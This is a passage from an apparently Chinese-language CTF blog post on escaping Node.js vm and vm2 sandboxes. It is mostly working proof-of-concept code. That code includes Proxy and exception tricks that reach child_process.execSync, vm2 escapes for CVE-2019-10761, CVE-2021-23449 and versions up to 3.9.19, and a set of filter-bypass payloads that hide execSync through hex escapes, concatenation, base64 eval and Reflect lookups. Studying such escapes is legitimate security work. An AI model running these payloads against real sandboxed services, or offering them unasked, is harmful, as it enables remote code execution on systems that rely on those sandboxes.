&#125;</span><span class="language-javascript">    &#125;)</span><span class="language-javascript">    <span class="hljs-keyword">return</span> a</span><span class="language-javascript">&#125;)()</span><span class="language-javascript"></span>`;const sandbox = <span class="hljs-built_in">Object</span>.create(<span class="hljs-literal">null</span>);const context = <span class="hljs-keyword">new</span> vm.createContext(sandbox);const res = vm.runInContext(script, context);console.log(res.abc)</code></pre></div><p><code>get:</code>这个钩子里写了一个恶意函数，当我们在沙箱外访问proxy对象的任意属性（不论是否存在）这个钩子就会自动运行</p><p>感觉像重写了get方法，然后访问属性就触发，跟上面感觉差不多</p><p>我最后是<code>console.log(&quot;hello &quot;+res);</code>有趣的是，再报错中执行了命令</p><div class="code-wrapper"><pre><code class="hljs xquery">console.log(<span class="hljs-string">&quot;hello &quot;</span>+res);                    ^TypeError:<span class="hljs-built_in"> string</span> <span class="hljs-string">&quot;zeropeach\86136</span><span class="hljs-string"></span><span class="hljs-string">&quot;</span> <span class="hljs-literal">is</span><span class="hljs-built_in"> not</span> a <span class="hljs-keyword">function</span>    <span class="hljs-keyword">at</span> Object.<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">anonymous</span>&gt;</span> (d:\ctf文件\nep\1.js:35:21)</span><span class="language-xml">    。。。。。。</span></code></pre></div><p>但是<code>console.log(res)</code>的结果却是<code>&#123;&#125;</code></p><h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>沙箱的返回值返回的是我们无法利用的对象或者没有返回值</p><p>我们可以借助异常，将沙箱内的对象抛出去，然后在外部输出</p><div class="code-wrapper"><pre><code class="hljs coffeescript">const vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);const script = `<span class="language-javascript"></span><span class="language-javascript">    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, &#123;</span><span class="language-javascript">        <span class="hljs-attr">get</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><span class="language-javascript">            <span class="hljs-keyword">const</span> cc = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span>;</span><span class="language-javascript">            <span class="hljs-keyword">const</span> p = (cc.<span class="hljs-property">constructor</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;return process&#x27;</span></span>))();</span><span class="language-javascript">            <span class="hljs-keyword">return</span> p.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-title function_">toString</span>();</span><span class="language-javascript">        &#125;</span><span class="language-javascript">    &#125;)</span><span class="language-javascript"></span>`;<span class="hljs-keyword">try</span> &#123;    vm.runInContext(script, vm.createContext(<span class="hljs-built_in">Object</span>.create(<span class="hljs-literal">null</span>)));&#125;<span class="hljs-keyword">catch</span>(e) &#123;    console.log(<span class="hljs-string">&quot;error:&quot;</span> + e) &#125;</code></pre></div><p>这里我们用catch捕获到了throw出的proxy对象，在console.log时由于将字符串与对象拼接，将报错信息和rce的回显一起带了出来。</p><p>跟上面的一样</p><h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> obj = &#123;&#125; <span class="hljs-comment">// 针对该对象的 message 属性定义一个 getter, 当访问 obj.message 时会调用对应的函数</span>obj.<span class="hljs-title function_">__defineGetter__</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;    <span class="hljs-keyword">const</span> c = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span>    <span class="hljs-keyword">const</span> p = (c[<span class="hljs-string">&#x27;constru&#x27;</span>+<span class="hljs-string">&#x27;ctor&#x27;</span>][<span class="hljs-string">&#x27;constru&#x27;</span>+<span class="hljs-string">&#x27;ctor&#x27;</span>](<span class="hljs-string">&#x27;return pro&#x27;</span>+<span class="hljs-string">&#x27;cess&#x27;</span>))()    <span class="hljs-keyword">return</span> p[<span class="hljs-string">&#x27;mainM&#x27;</span>+<span class="hljs-string">&#x27;odule&#x27;</span>][<span class="hljs-string">&#x27;requi&#x27;</span>+<span class="hljs-string">&#x27;re&#x27;</span>](<span class="hljs-string">&#x27;child_pr&#x27;</span>+<span class="hljs-string">&#x27;ocess&#x27;</span>)[<span class="hljs-string">&#x27;ex&#x27;</span>+<span class="hljs-string">&#x27;ecSync&#x27;</span>](<span class="hljs-string">&#x27;cat /flag&#x27;</span>).<span class="hljs-title function_">toString</span>();&#125;)<span class="hljs-keyword">throw</span> obj</code></pre></div><h2 id="vm2"><a href="#vm2" class="headerlink" title="vm2"></a>vm2</h2><p>vm2包的目录结构</p><p><img src="/../images/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/image-20231121190950763.png" alt="image-20231121190950763"></p><ul><li><code>cli.js</code>实现了可以在命令行中调用vm2 也就是bin下的vm2。</li><li><code>contextify.js</code>封装了三个对象：<code>Contextify Decontextify propertyDescriptor</code>，并且针对global的Buffer类进行了代理。</li><li><code>main.js</code> 是vm2执行的入口，导出了<code>NodeVM VM</code>这两个沙箱环境，还有一个<code>VMScript</code>实际上是封装了<code>vm.Script</code>。</li><li><code>sandbox.js</code>针对global的一些函数和变量进行了拦截，比如<code>setTimeout，setInterval</code>等</li></ul><p>vm2相比vm做出很大的改进，其中之一就是利用了es6新增的proxy特性，从而使用钩子拦截对<code>constructor和__proto__</code>这些属性的访问。</p><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> &#123;<span class="hljs-variable constant_">VM</span>, <span class="hljs-title class_">VMScript</span>&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm2&#x27;</span>);<span class="hljs-keyword">const</span> script = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VMScript</span>(<span class="hljs-string">&quot;let a = 2;a;&quot;</span>);<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>((<span class="hljs-keyword">new</span> <span class="hljs-title function_">VM</span>()).<span class="hljs-title function_">run</span>(script));</code></pre></div><p><img src="/../images/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/image-20231121191439463.png" alt="image-20231121191439463"></p><p>相比于vm的沙箱环境，vm2最重要的一步就是引入<code>sandbox.js</code>并针对context做封装</p><p>vm2出现过多次逃逸的问题，所以现有的代码被进行了大量修改，为了方便分析需要使用较老版本的vm2，但github上貌似将3.9以前的版本全都删除了</p><h2 id="vm2沙箱绕过"><a href="#vm2沙箱绕过" class="headerlink" title="vm2沙箱绕过"></a>vm2沙箱绕过</h2><p><a href="https://gist.github.com/leesh3288">leesh3288’s gists (github.com)</a></p><h3 id="CVE-2019-10761"><a href="#CVE-2019-10761" class="headerlink" title="CVE-2019-10761"></a>CVE-2019-10761</h3><p>vm2版本&lt;&#x3D;3.6.10</p><div class="code-wrapper"><pre><code class="hljs coffeescript"><span class="hljs-string">&quot;use strict&quot;</span>;const &#123;VM&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm2&#x27;</span>);const untrusted = `<span class="language-javascript"></span><span class="language-javascript"><span class="hljs-keyword">const</span> f = <span class="hljs-title class_">Buffer</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">write</span>;</span><span class="language-javascript"><span class="hljs-keyword">const</span> ft = &#123;</span><span class="language-javascript">        <span class="hljs-attr">length</span>: <span class="hljs-number">10</span>,</span><span class="language-javascript">        <span class="hljs-title function_">utf8Write</span>(<span class="hljs-params"></span>)&#123;</span><span class="language-javascript"></span><span class="language-javascript">        &#125;</span><span class="language-javascript">&#125;</span><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">r</span>(<span class="hljs-params">i</span>)&#123;</span><span class="language-javascript">    <span class="hljs-keyword">var</span> x = <span class="hljs-number">0</span>;</span><span class="language-javascript">    <span class="hljs-keyword">try</span>&#123;</span><span class="language-javascript">        x = <span class="hljs-title function_">r</span>(i);</span><span class="language-javascript">    &#125;<span class="hljs-keyword">catch</span>(e)&#123;&#125;</span><span class="language-javascript">    <span class="hljs-keyword">if</span>(<span class="hljs-title function_">typeof</span>(x)!==<span class="hljs-string">&#x27;number&#x27;</span>)</span><span class="language-javascript">        <span class="hljs-keyword">return</span> x;</span><span class="language-javascript">    <span class="hljs-keyword">if</span>(x!==i)</span><span class="language-javascript">        <span class="hljs-keyword">return</span> x+<span class="hljs-number">1</span>;</span><span class="language-javascript">    <span class="hljs-keyword">try</span>&#123;</span><span class="language-javascript">        f.<span class="hljs-title function_">call</span>(ft);</span><span class="language-javascript">    &#125;<span class="hljs-keyword">catch</span>(e)&#123;</span><span class="language-javascript">        <span class="hljs-keyword">return</span> e;</span><span class="language-javascript">    &#125;</span><span class="language-javascript">    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;</span><span class="language-javascript">&#125;</span><span class="language-javascript"><span class="hljs-keyword">var</span> i=<span class="hljs-number">1</span>;</span><span class="language-javascript"><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;</span><span class="language-javascript">    <span class="hljs-keyword">try</span>&#123;</span><span class="language-javascript">        i=<span class="hljs-title function_">r</span>(i).<span class="hljs-property">constructor</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&quot;return process&quot;</span></span>)(<span class="hljs-params"></span>);</span><span class="language-javascript">        <span class="hljs-keyword">break</span>;</span><span class="language-javascript">    &#125;<span class="hljs-keyword">catch</span>(x)&#123;</span><span class="language-javascript">        i++;</span><span class="language-javascript">    &#125;</span><span class="language-javascript">&#125;</span><span class="language-javascript">i.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&quot;whoami&quot;</span>).<span class="hljs-title function_">toString</span>()</span><span class="language-javascript"></span>`;<span class="hljs-keyword">try</span>&#123;    console.log(<span class="hljs-keyword">new</span> VM().run(untrusted));&#125;<span class="hljs-keyword">catch</span>(x)&#123;    console.log(x);&#125;</code></pre></div><p>当调用函数次数超过当前环境的最大值时，我们正好调用沙箱外的函数，就会导致沙箱外的调用栈被爆掉，我们在沙箱内catch这个异常对象，就拿到了一个沙箱外的对象。举个例子：</p><p>假设当前环境下最大递归值为1000，我们通过程序控制递归999次（注意这里说的递归值不是一直调用同一个函数的最大值，而是单次程序内调用函数次数的最大值，也就是调用栈的最大值）：</p><div class="code-wrapper"><pre><code class="hljs scss"><span class="hljs-built_in">r</span>(i);      <span class="hljs-comment">// 该函数递归999次</span>f<span class="hljs-selector-class">.call</span>(ft);    <span class="hljs-comment">// 递归到第1000次时调用f这个函数，f为Buffer.prototype.write，就是下面图片的这个函数</span>this<span class="hljs-selector-class">.utf8Write</span>()   <span class="hljs-comment">// 递归到1001次时为该函数，是一个外部函数，所以爆栈时捕捉的异常也是沙箱外，从而返回了一个沙箱外的异常对象</span></code></pre></div><h3 id="CVE-2021-23449"><a href="#CVE-2021-23449" class="headerlink" title="CVE-2021-23449"></a>CVE-2021-23449</h3><p>poc：</p><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> res = <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./foo.js&#x27;</span>)res.<span class="hljs-property">toString</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&quot;return this&quot;</span></span>)(<span class="hljs-params"></span>).<span class="hljs-property">process</span>.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&quot;whoami&quot;</span>).<span class="hljs-title function_">toString</span>();</code></pre></div><p>import()在JavaScript中是一个语法结构，不是函数，没法通过之前对<code>require</code>这种函数处理相同的方法来处理它，导致实际上我们调用import()的结果实际上是没有经过沙箱的，是一个外部变量。 我们再获取这个变量的属性即可绕过沙箱。 vm2对此的修复方法也很粗糙，正则匹配并替换了<code>\bimport\b</code>关键字，在编译失败的时候，报Dynamic Import not supported错误。</p><h3 id="VM2"><a href="#VM2" class="headerlink" title="VM2 &lt;&#x3D;3.9.15 POC"></a>VM2 &lt;&#x3D;3.9.15 POC</h3><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">const</span> &#123;VM&#125; = <span class="hljs-keyword">require</span>(<span class="hljs-string">&quot;vm2&quot;</span>);<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">vm</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">VM</span>();<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">code</span> = `aVM2_INTERNAL_TMPNAME = &#123;&#125;;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">stack</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>().stack;    <span class="hljs-title function_ invoke__">stack</span>();&#125;<span class="hljs-keyword">try</span> &#123;    <span class="hljs-title function_ invoke__">stack</span>();&#125; <span class="hljs-keyword">catch</span> (a<span class="hljs-variable">$tmpname</span>) &#123;    a<span class="hljs-variable">$tmpname</span>.constructor.<span class="hljs-title function_ invoke__">constructor</span>(<span class="hljs-string">&#x27;return process&#x27;</span>)().mainModule.<span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_ invoke__">execSync</span>(<span class="hljs-string">&#x27;touch pwned&#x27;</span>);&#125;`console.<span class="hljs-title function_ invoke__">log</span>(vm.<span class="hljs-title function_ invoke__">run</span>(code));</code></pre></div><h3 id="vm2-1"><a href="#vm2-1" class="headerlink" title="vm2&lt;&#x3D;3.9.16逃逸"></a>vm2&lt;&#x3D;3.9.16逃逸</h3><div class="code-wrapper"><pre><code class="hljs coffeescript">const &#123;VM&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm2&quot;</span>);const vm = <span class="hljs-keyword">new</span> VM();const code = `<span class="language-javascript"></span><span class="language-javascript">err = &#123;&#125;;</span><span class="language-javascript"><span class="hljs-keyword">const</span> handler = &#123;</span><span class="language-javascript">    <span class="hljs-title function_">getPrototypeOf</span>(<span class="hljs-params">target</span>) &#123;</span><span class="language-javascript">        (<span class="hljs-keyword">function</span> <span class="hljs-title function_">stack</span>(<span class="hljs-params"></span>) &#123;</span><span class="language-javascript">            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>().<span class="hljs-property">stack</span>;</span><span class="language-javascript">            <span class="hljs-title function_">stack</span>();</span><span class="language-javascript">        &#125;)();</span><span class="language-javascript">    &#125;</span><span class="language-javascript">&#125;;</span><span class="language-javascript">  </span><span class="language-javascript"><span class="hljs-keyword">const</span> proxiedErr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(err, handler);</span><span class="language-javascript"><span class="hljs-keyword">try</span> &#123;</span><span class="language-javascript">    <span class="hljs-keyword">throw</span> proxiedErr;</span><span class="language-javascript">&#125; <span class="hljs-keyword">catch</span> (&#123;<span class="hljs-attr">constructor</span>: c&#125;) &#123;</span><span class="language-javascript">    c.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;return process&#x27;</span></span>)(<span class="hljs-params"></span>).<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;touch pwned&#x27;</span>);</span><span class="language-javascript">&#125;</span><span class="language-javascript"></span>`console.log(vm.run(code));</code></pre></div><h3 id="vm2-2"><a href="#vm2-2" class="headerlink" title="vm2&lt;&#x3D;3.9.19 POC"></a>vm2&lt;&#x3D;3.9.19 POC</h3><div class="code-wrapper"><pre><code class="hljs coffeescript">const &#123;VM&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm2&quot;</span>);const vm = <span class="hljs-keyword">new</span> VM();const code = `<span class="language-javascript"></span><span class="language-javascript"><span class="hljs-keyword">const</span> customInspectSymbol = <span class="hljs-title class_">Symbol</span>.<span class="hljs-title function_">for</span>(<span class="hljs-string">&#x27;nodejs.util.inspect.custom&#x27;</span>);</span><span class="language-javascript"></span><span class="language-javascript">obj = &#123;</span><span class="language-javascript">    [customInspectSymbol]: <span class="hljs-function">(<span class="hljs-params">depth, opt, inspect</span>) =&gt;</span> &#123;</span><span class="language-javascript">        inspect.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;return process&#x27;</span></span>)(<span class="hljs-params"></span>).<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;touch pwned&#x27;</span>);</span><span class="language-javascript">    &#125;,</span><span class="language-javascript">    <span class="hljs-attr">valueOf</span>: <span class="hljs-literal">undefined</span>,</span><span class="language-javascript">    <span class="hljs-attr">constructor</span>: <span class="hljs-literal">undefined</span>,</span><span class="language-javascript">&#125;</span><span class="language-javascript"></span><span class="language-javascript"><span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title function_">compileStreaming</span>(obj).<span class="hljs-title function_">catch</span>(<span class="hljs-function">()=&gt;</span>&#123;&#125;);</span><span class="language-javascript"></span>`;vm.run(code);</code></pre></div><h3 id="vm2-3"><a href="#vm2-3" class="headerlink" title="vm2&lt;&#x3D;3.9.19 POC"></a>vm2&lt;&#x3D;3.9.19 POC</h3><div class="code-wrapper"><pre><code class="hljs coffeescript">const &#123;VM&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm2&quot;</span>);const vm = <span class="hljs-keyword">new</span> VM();const code = `<span class="language-javascript"></span><span class="language-javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params"></span>) &#123;</span><span class="language-javascript">    (<span class="hljs-keyword">function</span> <span class="hljs-title function_">stack</span>(<span class="hljs-params"></span>) &#123;</span><span class="language-javascript">        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>().<span class="hljs-property">stack</span>;</span><span class="language-javascript">        <span class="hljs-title function_">stack</span>();</span><span class="language-javascript">    &#125;)();</span><span class="language-javascript">&#125;</span><span class="language-javascript">p = <span class="hljs-title function_">fn</span>();</span><span class="language-javascript">p.<span class="hljs-property">constructor</span> = &#123;</span><span class="language-javascript">    [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">species</span>]: <span class="hljs-keyword">class</span> <span class="hljs-title class_">FakePromise</span> &#123;</span><span class="language-javascript">        <span class="hljs-title function_">constructor</span>(<span class="hljs-params">executor</span>) &#123;</span><span class="language-javascript">            <span class="hljs-title function_">executor</span>(</span><span class="language-javascript">                <span class="hljs-function">(<span class="hljs-params">x</span>) =&gt;</span> x,</span><span class="language-javascript">                <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123; <span class="hljs-keyword">return</span> err.<span class="hljs-property">constructor</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;return process&#x27;</span></span>)(<span class="hljs-params"></span>).<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;touch pwned&#x27;</span>); &#125;</span><span class="language-javascript">            )</span><span class="language-javascript">        &#125;</span><span class="language-javascript">    &#125;</span><span class="language-javascript">&#125;;</span><span class="language-javascript">p.<span class="hljs-title function_">then</span>();</span><span class="language-javascript"></span>`;console.log(vm.run(code));</code></pre></div><h3 id="知识星球trick"><a href="#知识星球trick" class="headerlink" title="知识星球trick"></a>知识星球trick</h3><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-title class_">Symbol</span> = &#123;  <span class="hljs-keyword">get</span> <span class="hljs-title function_">toStringTag</span>()&#123;    <span class="hljs-keyword">throw</span> <span class="hljs-function"><span class="hljs-params">f</span>=&gt;</span>f.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&quot;return process&quot;</span></span>)(<span class="hljs-params"></span>)  &#125;&#125;;<span class="hljs-keyword">try</span>&#123;  <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>());&#125;<span class="hljs-keyword">catch</span>(f)&#123;  <span class="hljs-title class_">Symbol</span> = &#123;&#125;;  <span class="hljs-title function_">f</span>(<span class="hljs-function">()=&gt;</span>&#123;&#125;).<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&quot;whoami&quot;</span>).<span class="hljs-title function_">toString</span>();&#125;</code></pre></div><p><img src="/../images/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/image-20231121201038924.png" alt="image-20231121201038924"></p><p>在vm2的原理中提到vm2会为对象配置代理并初始化，如果对象是以下类型：</p><p><img src="/../images/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/image-20231121200900952.png" alt="image-20231121200900952"></p><p>就会return <code>Decontextify.instance</code> 函数，这个函数中用到了Symbol全局对象，我们可以通过劫持Symbol对象的getter并抛出异常，再在沙箱内拿到这个异常对象就可以了</p><h1 id="nodejs命令执行bypass"><a href="#nodejs命令执行bypass" class="headerlink" title="nodejs命令执行bypass"></a>nodejs命令执行bypass</h1><p><a href="https://www.anquanke.com/post/id/237032#h2-0">https://www.anquanke.com/post/id/237032#h2-0</a></p><div class="code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">require</span><span class="hljs-params">(<span class="hljs-string">&quot;child_process&quot;</span>)</span></span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;exe\x63Sync&quot;</span>]</span>(<span class="hljs-string">&quot;curl 127.0.0.1:1234&quot;</span>)<span class="hljs-function"><span class="hljs-title">require</span><span class="hljs-params">(<span class="hljs-string">&quot;child_process&quot;</span>)</span></span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;exe\u0063Sync&quot;</span>]</span>(<span class="hljs-string">&quot;curl 127.0.0.1:1234&quot;</span>)<span class="hljs-function"><span class="hljs-title">require</span><span class="hljs-params">(<span class="hljs-string">&#x27;child_process&#x27;</span>)</span></span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;exe&#x27;</span>%2b<span class="hljs-string">&#x27;cSync&#x27;</span>]</span>(<span class="hljs-string">&#x27;curl 127.0.0.1:1234&#x27;</span>)<span class="hljs-function"><span class="hljs-title">require</span><span class="hljs-params">(<span class="hljs-string">&#x27;child_process&#x27;</span>)</span></span><span class="hljs-selector-attr">[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`]</span>(<span class="hljs-string">&#x27;curl 127.0.0.1:1234&#x27;</span>)<span class="hljs-function"><span class="hljs-title">require</span><span class="hljs-params">(<span class="hljs-string">&quot;child_process&quot;</span>)</span></span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;exe&quot;</span>.concat(<span class="hljs-string">&quot;cSync&quot;</span>)]</span>(<span class="hljs-string">&quot;curl 127.0.0.1:1234&quot;</span>)<span class="hljs-function"><span class="hljs-title">eval</span><span class="hljs-params">(Buffer.from(<span class="hljs-string">&#x27;Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=&#x27;</span>,<span class="hljs-string">&#x27;base64&#x27;</span>)</span></span><span class="hljs-selector-class">.toString</span>())</code></pre></div><h2 id="其他bypass"><a href="#其他bypass" class="headerlink" title="其他bypass"></a>其他bypass</h2><h3 id="Object-keys"><a href="#Object-keys" class="headerlink" title="Object.keys"></a>Object.keys</h3><p>实际上通过<code>require</code>导入的模块是一个<code>Object</code>，所以就可以用<code>Object</code>中的方法来操作获取内容。利用<code>Object.values</code>就可以拿到<code>child_process</code>中的各个函数方法，再通过数组下标就可以拿到<code>execSync</code></p><div class="code-wrapper"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-property">constructor</span>===<span class="hljs-title class_">Object</span>)<span class="hljs-comment">//true</span><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>))[<span class="hljs-number">5</span>](<span class="hljs-string">&#x27;curl 127.0.0.1:1234&#x27;</span>)</code></pre></div><h3 id="Reflect"><a href="#Reflect" class="headerlink" title="Reflect"></a>Reflect</h3><p>在js中，需要使用<code>Reflect</code>这个关键字来实现反射调用函数的方式。譬如要得到<code>eval</code>函数，可以首先通过<code>Reflect.ownKeys(global)</code>拿到所有函数，然后<code>global[Reflect.ownKeys(global).find(x=&gt;x.includes(&#39;eval&#39;))]</code>即可得到eval</p><div class="code-wrapper"><pre><code class="hljs js"><span class="hljs-title class_">Explainconsole</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(<span class="hljs-variable language_">global</span>))<span class="hljs-comment">//返回所有函数</span><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">global</span>[<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(<span class="hljs-variable language_">global</span>).<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">x</span>=&gt;</span>x.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;eval&#x27;</span>))])<span class="hljs-comment">//拿到eval</span></code></pre></div><p>拿到eval之后，就可以常规思路rce了</p><div class="code-wrapper"><pre><code class="hljs js"><span class="hljs-variable language_">global</span>[<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(<span class="hljs-variable language_">global</span>).<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">x</span>=&gt;</span>x.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;eval&#x27;</span>))](<span class="hljs-string">&#x27;global.process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&quot;curl 127.0.0.1:1234&quot;)&#x27;</span>)</code></pre></div><div class="code-wrapper"><pre><code class="hljs llvm"><span class="hljs-keyword">global</span>[Reflect.ownKeys(<span class="hljs-keyword">global</span>).find(<span class="hljs-keyword">x</span><span class="hljs-operator">=</span>&gt;<span class="hljs-keyword">x</span>.includes(&#x27;eval&#x27;))](&#x27;\<span class="hljs-keyword">x</span><span class="hljs-number">67</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">62</span>\<span class="hljs-keyword">x</span><span class="hljs-number">61</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>b\<span class="hljs-keyword">x</span><span class="hljs-number">52</span>\<span class="hljs-keyword">x</span><span class="hljs-number">65</span>\<span class="hljs-keyword">x</span><span class="hljs-number">66</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">65</span>\<span class="hljs-keyword">x</span><span class="hljs-number">63</span>\<span class="hljs-keyword">x</span><span class="hljs-number">74</span>\<span class="hljs-keyword">x</span><span class="hljs-number">2</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">77</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">4</span>b\<span class="hljs-keyword">x</span><span class="hljs-number">65</span>\<span class="hljs-keyword">x</span><span class="hljs-number">79</span>\<span class="hljs-keyword">x</span><span class="hljs-number">73</span>\<span class="hljs-keyword">x</span><span class="hljs-number">28</span>\<span class="hljs-keyword">x</span><span class="hljs-number">67</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">62</span>\<span class="hljs-keyword">x</span><span class="hljs-number">61</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">29</span>\<span class="hljs-keyword">x</span><span class="hljs-number">2</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">66</span>\<span class="hljs-keyword">x</span><span class="hljs-number">69</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">64</span>\<span class="hljs-keyword">x</span><span class="hljs-number">28</span>\<span class="hljs-keyword">x</span><span class="hljs-number">78</span>\<span class="hljs-keyword">x</span><span class="hljs-number">3</span>d\<span class="hljs-keyword">x</span><span class="hljs-number">3</span>e\<span class="hljs-keyword">x</span><span class="hljs-number">78</span>\<span 